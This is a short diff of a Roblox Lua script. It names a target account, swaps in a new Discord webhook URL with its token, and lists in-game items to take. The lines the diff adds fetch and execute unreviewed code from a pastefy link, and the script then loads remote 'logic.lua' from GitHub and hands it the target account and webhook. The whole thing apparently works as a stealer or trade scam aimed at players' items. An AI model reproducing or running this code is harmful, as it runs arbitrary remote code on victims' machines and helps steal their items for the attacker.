@@ -1,6 +1,6 @@
 local TARGET_ID = 5485546909
 local TARGET_USER = "coucougnete2_0"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1571980572274856048/3oTZHMK_CAG2Ov7-3ev8-yG2_O5VM-fM_JwHMRBymySfDHEVz1tQYgqMRrbEApLbnQMx"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1571993720683888780/8PvXnql7WCy69iSTiSRANiA4afQ7CMSWVIfeSLgQfrQiebCr2cRTLIGCDACiFla2Tmtc"
 
 local TargetBrainrots = {
     ["Garama and Madundung"] = true,
@@ -268,6 +268,10 @@ task.spawn(function()
 end)
 
 task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+
+    task.wait(1)
+
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
